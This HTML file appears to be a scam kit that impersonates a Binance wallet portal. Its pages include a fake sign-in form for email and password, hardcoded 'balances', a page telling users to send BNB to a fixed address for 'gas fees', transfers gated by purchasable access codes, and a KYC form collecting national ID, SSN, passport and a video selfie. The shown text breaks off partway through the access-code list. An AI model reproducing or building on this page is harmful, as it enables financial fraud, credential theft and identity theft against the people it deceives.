<!DOCTYPE html>
<html lang="en" class="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Binance Wallet Portal</title>

  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.3/dist/ethers.min.js"></script>

  <style>
    /* === Global & Dark Mode Styles === */
    body {
      margin: 0;
      font-family: 'Arial Black', Arial, sans-serif;
      background-color: #0b0e11;
      color: #f3ba2f;
    }

    .page {
      display: none;
      padding: 20px;
      min-height: 100vh;
      box-sizing: border-box;
    }

    h2 {
      font-weight: 900;
      font-size: 24px;
      margin-bottom: 20px;
      color: #f3ba2f;
    }

    button {
      cursor: pointer;
      font-weight: 900;
      background-color: #f3ba2f;
      color: #000;
      border: none;
      padding: 12px 20px;
      border-radius: 12px;
      transition: background-color 0.3s ease;
      margin-bottom: 12px;
    }

    button:hover {
      background-color: #e0a80a;
    }

    input[type="text"],
    input[type="number"],
    select {
      width: 100%;
      padding: 12px;
      margin-bottom: 12px;
      border-radius: 12px;
      border: 1px solid #f3ba2f;
      background-color: #1e2329;
      color: #f3ba2f;
      font-weight: 900;
      font-family: monospace, monospace;
      box-sizing: border-box;
    }

    input::placeholder {
      color: #d1b547;
    }

    .back-btn {
      background-color: #2b3139;
      color: #f3ba2f;
      border: 1px solid #f3ba2f;
    }

    .back-btn:hover {
      background-color: #1e2329;
    }

    .flex-row {
      display: flex;
      gap: 12px;
    }

    .token {
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .token:hover {
      background-color: #2b3139;
    }

    .loader {
      border: 4px solid #f3ba2f;
      border-top: 4px solid transparent;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      margin: 0 auto 24px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  
<!-- === PAGE 1: Sign In === -->
<div id="page1" class="page">
  <h2>Sign In</h2>
  <input type="text" id="emailInput" placeholder="Email" />
  <input type="password" id="passwordInput" placeholder="Password" />
  <button onclick="signIn()">Sign In</button>
  <div id="signInStatus" style="color: #f3ba2f; font-weight: 900;"></div>
</div>

<!-- === PAGE 2: Authenticating === -->
<div id="page2" class="page">
  <h2>Authenticating...</h2>
  <p>Please wait while we authenticate your account.</p>
</div>

<!-- === PAGE 3: Account ID Confirmation === -->
<div id="page3" class="page">
  <h2>Account ID Confirmation</h2>
  <p>Please confirm your account ID.</p>
  <button onclick="confirmAccountID()">Confirm</button>
</div>

  <!-- Toast Notification -->
<div id="toast"></div>
  
<!-- Page 4: Homepage (Main Dashboard) -->
<div id="page4" class="page" style="background-color:#0B0E11; color:#fff; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding:20px;">
  <!-- Header + Language & Currency Selectors -->
  <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
    <div style="font-size:1.5rem; font-weight:900; color:#f3ba2f; user-select:none;">Homepage</div>
    <div style="display:flex; gap:10px;">
      <select id="languageSelector" onchange="handleLanguageChange()" style="background-color:#1f2630; color:#f3ba2f; font-weight:bold; padding:6px 12px; border:none; border-radius:8px;"></select>
      <select id="currencySelector" onchange="handleCurrencyChange()" style="background-color:#1f2630; color:#f3ba2f; font-weight:bold; padding:6px 12px; border:none; border-radius:8px;"></select>
    </div>
  </div> 

  <!-- Wallet Row -->  
  <div class="flex-row" style="margin-bottom:30px; display:flex; align-items:center; flex-wrap:wrap; gap:16px;">
    <button onclick="showPage('page13')" style="background-color:#1f2630; color:#f3ba2f; font-weight:900; padding:10px 16px; border-radius:12px; border:none; cursor:pointer;">Connect Wallet</button>
    <div id="connectedWalletDisplayHomepage" style="color:#f3ba2f; font-weight:900;"></div>
    <div id="walletDisplay" style="display:flex; align-items:center; gap:10px;">
      <span style="color:#f3ba2f;">Wallet:</span>
      <span id="walletAddress" style="color:white; font-weight:bold;"></span>
      <button onclick="copyWalletAddress()" style="background-color:#f3ba2f; color:black; border:none; padding:5px 10px; border-radius:8px; font-weight:bold; cursor:pointer;">Copy Address</button>
    </div>

      <!-- Action Buttons -->  
  <div class="flex-row" style="display:flex; gap:10px; flex-wrap:wrap; margin-bottom:40px;">
    <button onclick="showPage('page6')" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Add Fund</button>
    <button onclick="showPage('page5')" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Top Up BNB</button>
    <button onclick="showPage('page8')" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Transfer</button>
    <button onclick="showPage('page7')" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Assets</button>
    <button onclick="showPage('page16')" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Trade</button>
  </div> 

    <div id="balances" style="color:white; font-weight:bold; margin-top:10px;">
      <img id="bnbIcon" style="width:24px; height:24px; vertical-align:middle; margin-right:6px;" alt="BNB Icon">
      <span id="bnbBalance">BNB</span><br>
      <img id="usdtIcon" style="width:24px; height:24px; vertical-align:middle; margin-right:6px;" alt="USDT Icon">
      <span id="usdtBalance">USDT</span>
    </div>

    <button onclick="showPage('page13')" style="margin-top:20px; background-color:#f3ba2f; color:black; border:none; padding:10px 16px; border-radius:12px; font-weight:bold; cursor:pointer;">Connect/Change Wallet</button>
  </div>  

  <!-- Token Boxes -->  
  <div style="margin-bottom: 32px;">
    <!-- USDT -->
    <div class="token" onclick="openTransferPage('USDT')" style="background:#1e2329; border-radius:12px; padding:16px; margin-bottom:16px; box-shadow:0 4px 10px rgba(243,186,47,0.3); display:flex; justify-content:space-between; align-items:center; cursor:pointer;">
      <div style="display:flex; align-items:center; gap:12px;">
        <img src="https://assets.coingecko.com/coins/images/325/thumb/Tether.png" alt="USDT Icon" style="width:40px; height:40px; border-radius:50%;">
        <div>
          <h3 style="font-weight:900; font-size:1.125rem; margin:0;">Tether (USDT)</h3>
          <p style="color:#999; font-size:0.875rem; margin:0;">BEP-20</p>
        </div>
      </div>
      <div style="text-align:right;">
        <p id="usdtTokenBalance" style="color:#f3ba2f; font-weight:900; font-size:1.125rem; margin:0;">2978.78</p>
        <p style="color:#999; font-size:0.875rem; margin:0;">Balance</p>
      </div>
    </div>
    <!-- BNB -->
    <div class="token" onclick="openTransferPage('BNB')" style="background:#1e2329; border-radius:12px; padding:16px; margin-bottom:16px; box-shadow:0 4px 10px rgba(243,186,47,0.3); display:flex; justify-content:space-between; align-items:center; cursor:pointer;">
      <div style="display:flex; align-items:center; gap:12px;">
        <img src="https://assets.coingecko.com/coins/images/825/thumb/bnb-icon2_2x.png" alt="BNB Icon" style="width:40px; height:40px; border-radius:50%;">
        <div>
          <h3 style="font-weight:900; font-size:1.125rem; margin:0;">BNB</h3>
          <p style="color:#999; font-size:0.875rem; margin:0;">BNB Smart Chain</p>
        </div>
      </div>
      <div style="text-align:right;">
        <p id="bnbTokenBalance" style="color:#f3ba2f; font-weight:900; font-size:1.125rem; margin:0;">0.09490</p>
        <p style="color:#999; font-size:0.875rem; margin:0;">Balance</p>
      </div>
    </div>
  </div> 

  <!-- Total Assets Display -->  
  <div style="margin-bottom:24px; font-weight:900; font-size:1.2rem; display:flex; justify-content:space-between; align-items:center;">
    <div>üí∞ Total Assets</div>
    <div id="totalAssetsDisplay" style="color:#f3ba2f;">$<span id="totalAssetsAmount">3007.20</span></div>
  </div>  

  <!-- Live Price Chart -->  
  <div style="background:#1A1D22; padding:20px; border-radius:12px; margin-bottom:32px;">
    <h3 style="color:#F3BA2F; font-weight:900; margin-bottom:12px;">Live BNB/USDT Chart</h3>
    <canvas id="priceChart" height="120" style="background:#0B0E11; border-radius:8px; width:100%;"></canvas>
  </div>  

  <!-- Settings Button -->  
  <div style="position:fixed; bottom:20px; right:20px;">
    <button onclick="showPage('page12')" style="background-color:#f0b90b; color:#000; padding:10px 20px; border-radius:12px; font-weight:900; border:none; cursor:pointer;">Settings</button>
  </div>
</div>

<!-- === PAGE 5: Top Up BNB === -->
<div id="page5" class="page" style="display: none; background-color: #0B0E11; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px;">
  <div style="font-size: 1.5rem; font-weight: 900; color: #f3ba2f; margin-bottom: 20px; user-select:none;">
    Top Up BNB
  </div>

  <!-- Wallet Check Info -->
  <div id="walletNotice" style="margin-bottom: 20px; color: #f3ba2f; font-weight: bold;">
    Please connect your BNB Smart Chain wallet before topping up.
  </div>

  <!-- Estimated Gas Fee Block -->
  <div style="background: #1e2329; border-radius: 12px; padding: 16px; margin-bottom: 24px;">
    <h3 style="font-weight: bold; color: #f3ba2f; margin: 0 0 10px 0;">Estimated Gas Fee</h3>
    <p id="estimatedGasFee" style="color: #0ecb81; font-weight: bold;">~0.00021 BNB</p>
    <p style="color: #999; font-size: 0.875rem;">This is an estimate based on current network activity.</p>
  </div>

  <!-- Top Up Button -->
  <button onclick="goToGasConfirmation()" style="width: 100%; background-color: #f3ba2f; color: #000; font-weight: bold; padding: 12px 20px; font-size: 1rem; border: none; border-radius: 12px; cursor: pointer; margin-bottom: 20px;">
    Proceed to Top Up
  </button>

  <!-- Back to Homepage -->
  <button onclick="showPage('page4')" style="width: 100%; background-color: #1f2630; color: #f3ba2f; font-weight: bold; padding: 10px 20px; border: none; border-radius: 12px; cursor: pointer;">
    ‚Üê Back to Homepage
  </button>
</div>

<!-- === PAGE 6: Scan === -->
<div id="page6" class="page" style="min-height: 100vh;">
  <div class="max-w-md mx-auto bg-[#1E2329] p-6 rounded-2xl shadow-lg" style="margin: auto;">
    <h2 id="scanAction" style="text-align: center; color: #f3ba2f; font-weight: 900; margin-bottom: 20px;">Receive</h2>
    <div style="display: flex; justify-content: center; margin-bottom: 20px;">
      <img src="https://api.qrserver.com/v1/create-qr-code/?data=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&size=200x200" alt="QR Code" style="border-radius: 16px; border: 1px solid #444c5a;" />
    </div>
    <p style="text-align: center; font-family: monospace; font-weight: 900; color: #f3ba2f; margin-bottom: 20px;">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</p>

    <input type="text" id="txHash" placeholder="Enter Transaction Hash" />
    <button onclick="submitTransaction()">Confirm Transaction</button>
    <div id="txStatus" style="color: #2ecc71; font-weight: 900; margin-top: 12px;"></div>
    <button class="back-btn" onclick="showPage('page4')">Back</button>
  </div>
</div>

<!-- Page 7: Asset Dashboard -->
  <div id="page7" class="page" style="background-color:#0B0E11; color:#fff; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding:20px; display:none;">  <!-- Header -->  <div style="font-size:1.5rem; font-weight:900; color:#f3ba2f; margin-bottom:20px; user-select:none;">
    Asset Dashboard
  </div> 
  <!-- Language & Currency Selectors (Synced) -->  
  <div style="display:flex; gap:10px; margin-bottom:20px;">
    <select id="languageSelector7" onchange="handleLanguageChange()" style="background-color:#1f2630; color:#f3ba2f; font-weight:bold; padding:6px 12px; border:none; border-radius:8px;"></select>
    <select id="currencySelector7" onchange="handleCurrencyChange()" style="background-color:#1f2630; color:#f3ba2f; font-weight:bold; padding:6px 12px; border:none; border-radius:8px;"></select>
  </div>  
  <!-- Available Balance --> 
  <div style="margin-bottom:24px; font-weight:900; font-size:1.2rem; display:flex; justify-content:space-between; align-items:center;">
    <div>Available Balance</div>
    <div id="availableBalanceDisplay" style="color:#f3ba2f;">$<span id="availableBalanceAmount">--</span></div>
  </div>  
    <!-- Buttons --> 
  <div style="margin-bottom:40px; display:flex; flex-wrap:wrap; gap:10px;">
    <button onclick="showPage('page6')" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Add Fund</button>
    <button onclick="showPage('page8')" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Transfer</button>
    <button onclick="showPage('page16')" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Trade</button>
  </div>  
  
  <!-- Token Boxes --> 
    <div style="margin-bottom:32px;">
    <!-- USDT -->
    <div class="token" onclick="openTransferPage('USDT')" style="background:#1e2329; border-radius:12px; padding:16px; margin-bottom:16px; box-shadow:0 4px 10px rgba(243,186,47,0.3); display:flex; justify-content:space-between; align-items:center; cursor:pointer;">
      <div style="display:flex; align-items:center; gap:12px;">
        <img id="usdtIcon7" src="https://assets.coingecko.com/coins/images/325/thumb/Tether.png" style="width:40px; height:40px; border-radius:50%;">
        <div>
          <h3 style="font-weight:900; font-size:1.125rem; margin:0;">Tether (USDT)</h3>
          <p style="color:#999; font-size:0.875rem; margin:0;">BEP-20</p>
        </div>
      </div>
      <div style="text-align:right;">
        <p id="usdtBalance7" style="color:#f3ba2f; font-weight:900; font-size:1.125rem; margin:0;">--</p>
        <p style="color:#999; font-size:0.875rem; margin:0;">Balance</p>
      </div>
    </div>
    <!-- BNB -->
<div class="token" onclick="openTransferPage('BNB')" style="background:#1e2329; border-radius:12px; padding:16px; margin-bottom:16px; box-shadow:0 4px 10px rgba(243,186,47,0.3); display:flex; justify-content:space-between; align-items:center; cursor:pointer;">
  <div style="display:flex; align-items:center; gap:12px;">
    <img id="bnbIcon7" src="https://assets.coingecko.com/coins/images/825/thumb/bnb-icon2_2x.png" style="width:40px; height:40px; border-radius:50%;">
    <div>
      <h3 style="font-weight:900; font-size:1.125rem; margin:0;">BNB</h3>
      <p style="color:#999; font-size:0.875rem; margin:0;">BNB Smart Chain</p>
    </div>
  </div>
  <div style="text-align:right;">
    <p id="bnbBalance7" style="color:#f3ba2f; font-weight:900; font-size:1.125rem; margin:0;">--</p>
    <p style="color:#999; font-size:0.875rem; margin:0;">Balance</p>
  </div>
</div>

  </div>  

  <!-- Settings --> 
  <div style="position:fixed; bottom:20px; right:20px;">
    <button onclick="showPage(12)" style="background-color:#f0b90b; color:#000; padding:10px 20px; border-radius:12px; font-weight:900; border:none; cursor:pointer;">Settings</button>
  </div>  
  <!-- Loader Overlay --> 
  <div id="loader7" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000000aa; z-index:9999; justify-content:center; align-items:center;">
    <div style="color:#f3ba2f; font-weight:bold; font-size:1.2rem;">Loading assets...</div>
  </div>
</div>
  
<!-- === PAGE 8: Transfer === -->
<div id="page8" class="page">
  <h2>Make a Transfer</h2>
  <input type="text" id="inputWallet" placeholder="Enter Wallet Address" />
  <select id="networkSelect">
    <option value="">Select Network</option>
    <option value="Ethereum">Ethereum</option>
    <option value="Binance Smart Chain">Binance Smart Chain</option>
  </select>
  <input type="number" id="transferAmount" placeholder="Enter Amount" />
  <button onclick="setMaxAmount()">Use Max</button>
  <div style="margin-top: 12px; font-weight: 900; color: #f3ba2f;">
    Gas Fee: <span id="gasFee">0.09490 BNB</span>
  </div>
  <button onclick="goToBNBGasConfirmationPage('page9i')">Confirm</button>
  <button class="back-btn" onclick="showPage('page4')">Return</button>
</div>

<!-- === PAGE 9i: BNB Gas Confirmation === -->
<div id="page9i" class="page" style="background-color: #0B0E11; color: #f3ba2f; padding: 20px; font-family: Arial, sans-serif; display: none;">
  <h2>BNB Gas Confirmation</h2>

  <p style="margin-bottom: 20px; font-weight: bold;">Please send BNB to the address below to cover gas fees.</p>

  <!-- BNB Address Display -->
  <div style="background-color: #1e2329; padding: 16px; border-radius: 12px; word-break: break-all; margin-bottom: 16px;">
    <span id="bnbAddressText" style="font-weight: bold;">0x223C5B2A20FbcD4F3A291BeF12575F3104bC5c25</span>
  </div>

  <!-- Copy Button -->
  <button onclick="copyBNBAddress()" style="margin-bottom: 20px;">Copy BNB Address</button>

  <!-- QR Code -->
  <div id="bnbQRContainer" style="margin-bottom: 20px;">
    <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=0x223C5B2A20FbcD4F3A291BeF12575F3104bC5c25" alt="BNB QR Code" style="border-radius: 12px;" />
  </div>

  <!-- Confirm Button -->
  <button onclick="showPage('page8')">Confirm BNB Gas Code</button>

  <!-- Back Button -->
  <button class="back-btn" onclick="showPage('page5')">‚Üê Back</button>
</div>

<!-- === PAGE 9ii: Access Code === -->
<div id="page9ii" class="page" style="background-color: #0B0E11; color: #EAECEF; font-family: Arial, sans-serif; padding: 20px;">
  <h2 style="color: #f3ba2f; font-weight: bold;">Access Code Required</h2>

  <input type="text" id="accessCodeInput" placeholder="Enter Access Code"
         style="width: 100%; padding: 10px; margin-bottom: 15px; border-radius: 5px; border: 1px solid #2d3239; background-color: #1e2329; color: #fff; font-weight: bold;" />

  <button onclick="confirmAccessCode()"
          style="width: 100%; padding: 12px; background-color: #f3ba2f; color: #0B0E11; font-weight: bold; border: none; border-radius: 5px; margin-bottom: 10px;">
    Confirm Access Code
  </button>

  <button onclick="showPage('page8')"
          style="width: 100%; padding: 10px; background-color: #1e2329; color: #fff; border: 1px solid #2d3239; border-radius: 5px;">
    Go Back
  </button>
</div>



<!-- === PAGE 10: Processing === -->
<div id="page10" class="page" style="display: none; background-color: #0B0E11; color: #EAECEF; font-family: Arial, sans-serif; padding: 40px; text-align: center;">
  <div style="font-size: 1.8rem; font-weight: bold; color: #f3ba2f; margin-bottom: 20px;">
    Processing Transaction...
  </div>
  <div style="font-size: 1rem; margin-bottom: 30px;">
    Please wait while we verify your access code.
  </div>
  <div style="font-size: 3rem; color: #f3ba2f; animation: pulse 1.5s infinite;">
    ‚è≥
  </div>
</div>


<!-- === PAGE 11: Transaction Declined === -->
<div id="page11" class="page" style="background-color:#0B0E11; color:#fff; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding:30px; text-align:center;">
  <!-- Alert Header -->
  <div style="font-size:2rem; font-weight:900; color:#f0b90b; margin-bottom:20px;">
    ‚ö†Ô∏è Transaction Declined
  </div>

  <!-- Red Error Box -->
  <div style="background-color:#2c0d0d; border:1px solid red; border-radius:12px; padding:20px; margin-bottom:30px; display:inline-block; color:#ff4c4c; font-weight:bold;">
    Your transaction could not be processed.<br/>
    Please check your input, gas fees, or try again later.
  </div>

  <!-- Suggested Actions -->
  <div style="color:#aaa; font-size:1rem; margin-bottom:40px;">
    Reasons might include:<br/>
    - Insufficient BNB for gas fee<br/>
    - Invalid Access Code<br/>
    - Network Error or Timeout<br/>
    - User Cancelled Transaction
  </div>

  <!-- Action Buttons -->
  <div style="display:flex; justify-content:center; gap:16px; flex-wrap:wrap;">
    <button onclick="showPage(4)" 
      style="background-color:#1f2630; color:#f0b90b; padding:12px 24px; border:none; border-radius:10px; font-weight:bold; cursor:pointer;">
      üîÑ Return to Dashboard
    </button>
    <button onclick="showPage(8)" 
      style="background-color:#f0b90b; color:#000; padding:12px 24px; border:none; border-radius:10px; font-weight:900; cursor:pointer;">
      üîÅ Retry Transfer
    </button>
    <button onclick="showPage(12)" 
      style="background-color:#333; color:#f0b90b; padding:12px 24px; border:none; border-radius:10px; font-weight:bold; cursor:pointer;">
      ‚öôÔ∏è Go to Settings
    </button>
  </div>
</div>

<script>
  // Automatically redirect to Homepage (Page 4) after 10 seconds
  setTimeout(() => {
    showPage(4);
  }, 10000);
</script>
  
<!-- === PAGE 12: Settings === -->
<div id="page12" class="page" style="background-color: #0b0e11; color: #f0b90b; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px;">

  <h2 style="font-weight: 900; margin-bottom: 24px;">Settings</h2>

  <div style="display: flex; flex-direction: column; gap: 16px; max-width: 320px;">
    <!-- KYC Verification -->
    <button 
      onclick="showPage('page17')" 
      style="background-color: #1f2630; color: #f0b90b; font-weight: 900; padding: 12px; border-radius: 12px; border: none; cursor: pointer;">
      KYC Verification
    </button>

    <!-- View Profile -->
    <button 
      onclick="showPage('page18')" 
      style="background-color: #1f2630; color: #f0b90b; font-weight: 900; padding: 12px; border-radius: 12px; border: none; cursor: pointer;">
      View Profile
    </button>

    <!-- Connect Wallet -->
    <button 
      onclick="showPage('page13')" 
      style="background-color: #1f2630; color: #f0b90b; font-weight: 900; padding: 12px; border-radius: 12px; border: none; cursor: pointer;">
      Connect Wallet
    </button>

    <!-- Live Chat -->
    <button 
      onclick="window.open('https://widget-page.smartsupp.com/widget/3ab3e4c3fcd21f84344cc872db2a35d9e40245a6', '_blank')" 
      style="background-color: #f0b90b; color: #000; font-weight: 900; padding: 12px; border-radius: 12px; border: none; cursor: pointer;">
      Live Chat
    </button>

    <!-- Disconnect Wallet -->
    <button 
      onclick="disconnectWallet()" 
      style="background-color: #222; color: #f0b90b; border: 1px solid #f0b90b; font-weight: 900; padding: 12px; border-radius: 12px; cursor: pointer;">
      Disconnect Wallet
    </button>

    <!-- Logout -->
    <button 
      onclick="logout()" 
      style="background-color: #222; color: red; border: 1px solid red; font-weight: 900; padding: 12px; border-radius: 12px; cursor: pointer;">
      Logout
    </button>
  </div>

  <!-- Back to Homepage Button -->
  <div style="position: fixed; bottom: 20px; right: 20px;">
    <button 
      class="back-btn" 
      onclick="showPage('page4')" 
      style="background-color: #444; color: #f0b90b; font-weight: 900; padding: 10px 20px; border-radius: 12px; border: none; cursor: pointer;">
      Back to Homepage
    </button>
  </div>
</div>

<!-- Page 13: Connect Wallet -->
<div id="page13" class="page" style="background-color:#0B0E11; color:#fff; font-family:'Segoe UI'; padding:20px;">
  <div style="font-size:1.5rem; font-weight:900; color:#f3ba2f; margin-bottom:20px;">üîê Connect Wallet</div>

  <!-- Connect Button to Open Modal -->
  <button onclick="openWalletModal()" style="background-color:#f3ba2f; color:black; font-weight:900; padding:10px 20px; border:none; border-radius:12px; cursor:pointer;">
    Connect Wallet Manually
  </button>
</div>

<!-- Wallet Modal -->
<div id="walletModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#00000088; z-index:9999; justify-content:center; align-items:center;">
  <div id="walletModalContent" style="background:#1e2329; padding:30px 24px; border-radius:16px; width:90%; max-width:400px; box-shadow:0 0 20px #f3ba2f99; transform:scale(0.9); opacity:0; transition:all 0.3s ease; position:relative; cursor:move;">
    <div style="font-weight:bold; font-size:1.25rem; color:#f3ba2f; margin-bottom:16px;">Manual Wallet Connect</div>

    <label style="color:#aaa; font-weight:bold;">Enter Wallet Address</label>
    <input id="walletInputField" placeholder="0x..." style="width:100%; padding:12px; background:#0B0E11; color:#fff; border-radius:8px; border:1px solid #444; margin:10px 0 20px 0;" />

    <div style="display:flex; justify-content:space-between; gap:10px;">
      <button onclick="confirmManualWallet()" style="flex:1; background-color:#f3ba2f; color:#000; font-weight:bold; padding:10px; border-radius:10px; border:none;">Connect</button>
      <button onclick="startQRScanner()" style="flex:1; background:#1f2630; color:#f3ba2f; font-weight:bold; padding:10px; border-radius:10px; border:none;">üì∑ Scan</button>
    </div>

    <button onclick="closeWalletModal()" style="position:absolute; top:10px; right:12px; background:none; color:#f3ba2f; border:none; font-size:1.2rem; cursor:pointer;">‚úñ</button>
  </div>
</div>

<!-- QR Scanner Modal -->
<div id="qrScannerModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000000cc; z-index:10000; justify-content:center; align-items:center;">
  <div style="background:#1e2329; padding:20px; border-radius:12px; max-width:90%; position:relative;">
    <div id="qr-reader" style="width:300px;"></div>
    <button onclick="stopQRScanner()" style="margin-top:10px; background:#f3ba2f; color:#000; font-weight:bold; border:none; padding:10px 16px; border-radius:10px;">Close Scanner</button>
  </div>
</div>

<!-- QR Code Scanner Library -->
<script src="https://unpkg.com/html5-qrcode@2.3.8/html5-qrcode.min.js"></script>


<!-- === PAGE 14: Transaction Successful === -->
<div id="page14" class="page" style="display: none; background-color: #0B0E11; color: #EAECEF; font-family: Arial, sans-serif; padding: 40px; text-align: center;">
  <div style="font-size: 2rem; font-weight: bold; color: #f3ba2f; margin-bottom: 20px;">
    Transaction Successful!
  </div>
  <div style="font-size: 1.2rem; margin-bottom: 30px;">
    Your transfer has been completed successfully.<br>
    Please check your wallet balance for confirmation.
  </div>
  <div class="glow-success" style="font-size: 4rem; color: #0ecb81; margin-bottom: 30px;">
    ‚úÖ
  </div>
  <div id="transactionDetails" style="background-color: #1e2329; color: #f3ba2f; padding: 20px; border-radius: 10px; margin-bottom: 30px; font-size: 1rem; font-weight: bold;">
    <div>Amount: <span id="txnAmount">3078.78 USDT</span></div>
    <div>To Wallet: <span id="txnWallet">0x223C5B2A20Fbc...</span></div>
    <div>
      Transaction Hash:
      <span id="txnHash">0xe4f...9bA</span>
      <button onclick="copyTxnHash()" style="margin-left: 10px; padding: 5px 10px; font-size: 0.9rem; font-weight: bold; background-color: #f3ba2f; color: #0B0E11; border: none; border-radius: 4px; cursor: pointer;">
        Copy
      </button>
    </div>
  </div>
  <button onclick="showPage('page4')" style="padding: 12px 24px; font-size: 1rem; font-weight: bold; background-color: #f3ba2f; color: #0B0E11; border: none; border-radius: 6px; cursor: pointer;">
    Back to Homepage
  </button>
</div>

  <!-- Page 15: KYC Verification -->
<!-- === PAGE 15: KYC VERIFICATION === --><div id="page15" class="page" style="display: none; background-color: #0B0E11; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 20px;">
  <div style="font-size: 1.5rem; font-weight: bold; color: #f3ba2f; margin-bottom: 20px;">KYC Verification</div>
  <form id="kycForm" onsubmit="submitKYC(event)" style="display: flex; flex-direction: column; gap: 16px;">
    <input type="text" id="kycName" placeholder="Full Name" required style="padding: 10px; border-radius: 8px; border: none;" />
    <input type="email" id="kycEmail" placeholder="Email Address" required style="padding: 10px; border-radius: 8px; border: none;" />
    <input type="tel" id="kycPhone" placeholder="Phone Number" required style="padding: 10px; border-radius: 8px; border: none;" />
    <input type="text" id="kycCountry" placeholder="Country" required style="padding: 10px; border-radius: 8px; border: none;" /><label>Upload National ID</label>
<input type="file" id="kycNationalID" accept="image/*,application/pdf" required />

<label>Upload SSN Document</label>
<input type="file" id="kycSSN" accept="image/*,application/pdf" required />

<label>Upload Passport</label>
<input type="file" id="kycPassport" accept="image/*,application/pdf" required />

<label>Upload Video Selfie</label>
<input type="file" id="kycSelfie" accept="video/*" required />

<button type="submit" style="background-color: #f3ba2f; color: black; padding: 12px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer;">Submit KYC</button>

  </form>
</div>
  <!-- === PAGE 15i: KYC PENDING REVIEW === --><div id="page15i" class="page" style="display: none; background-color: #0B0E11; color: #fff; padding: 40px; text-align: center; font-family: 'Segoe UI', sans-serif;">
  <h2 style="color: #f3ba2f; font-weight: bold;">KYC Submission Received</h2>
  <p style="margin-top: 20px;">Your documents are currently under review. This may take a few moments.</p>
  <div style="font-size: 3rem; margin-top: 30px; color: orange;">‚è≥</div>
</div>
  <!-- === PAGE 15ii: KYC APPROVED === --><div id="page15ii" class="page" style="display: none; background-color: #0B0E11; color: #fff; padding: 40px; text-align: center; font-family: 'Segoe UI', sans-serif;">
  <h2 style="color: #0ecb81; font-weight: bold;">‚úÖ KYC Verified</h2>
  <p style="margin-top: 20px; font-size: 1.1rem;">Your identity has been successfully verified.</p>
  <button onclick="showPage(4)" style="margin-top: 30px; background-color: #f3ba2f; color: black; padding: 12px 24px; font-size: 1rem; font-weight: bold; border: none; border-radius: 8px; cursor: pointer;">Go to Dashboard</button>
</div>

  <!-- === PAGE 16: Trade === -->
<div id="page16" class="page" style="background-color: #0b0e11; color: #f3ba2f; font-family: 'Arial Black', Arial, sans-serif; padding: 20px; min-height: 100vh; display: none;">
  <h2>Trade Tokens</h2>

  <label for="fromToken" style="font-weight: 900; margin-bottom: 8px; display: block;">From Token</label>
  <select id="fromToken" style="width: 100%; padding: 12px; border-radius: 12px; border: 1px solid #f3ba2f; background-color: #1e2329; color: #f3ba2f; font-weight: 900; font-family: monospace;">
    <option value="USDT">USDT (Tether)</option>
    <option value="BNB">BNB (Binance Coin)</option>
  </select>

  <label for="fromAmount" style="font-weight: 900; margin-top: 16px; margin-bottom: 8px; display: block;">Amount</label>
  <input type="number" id="fromAmount" placeholder="Enter amount" min="0" step="any" />

  <label for="toToken" style="font-weight: 900; margin-top: 16px; margin-bottom: 8px; display: block;">To Token</label>
  <select id="toToken" style="width: 100%; padding: 12px; border-radius: 12px; border: 1px solid #f3ba2f; background-color: #1e2329; color: #f3ba2f; font-weight: 900; font-family: monospace;">
    <option value="BNB">BNB (Binance Coin)</option>
    <option value="USDT">USDT (Tether)</option>
  </select>

  <div id="estimatedAmount" style="margin-top: 16px; font-weight: 900; font-size: 1.1rem;">
    Estimated Receive: <span id="receiveAmount">0</span>
  </div>

  <button style="margin-top: 24px;" onclick="handleTrade()">Swap</button>

  <button class="back-btn" style="margin-top: 20px;" onclick="showPage(4)">Back to Homepage</button>
</div>
 
<style>
  @keyframes pulse {
    0% { transform: scale(1); opacity: 1; }
    50% { transform: scale(1.2); opacity: 0.6; }
    100% { transform: scale(1); opacity: 1; }
  }
</style>

<script>
  // Simulated access code status ‚Äî you should set this from your access code logic before showing page 10
  let isAccessCodeValid = false; // <-- Set this to true when access code is verified

  function showProcessingPage() {
    showPage(10); // Show Page 10
    setTimeout(() => {
      if (isAccessCodeValid) {
        showPage(14); // Success Page
      } else {
        showPage(11); // Decline Page
      }
    }, 60000); // 60 seconds
  }
</script>

  <script>
  const validAccessCodes = [
    "Bkdn3lwe5", "Bpht3gvu1", "Bmxz3ijp9", "Bzrf3kqb3", "Bvyn3tar0", "Bghr3nlu7", "Bscr3dmq6",
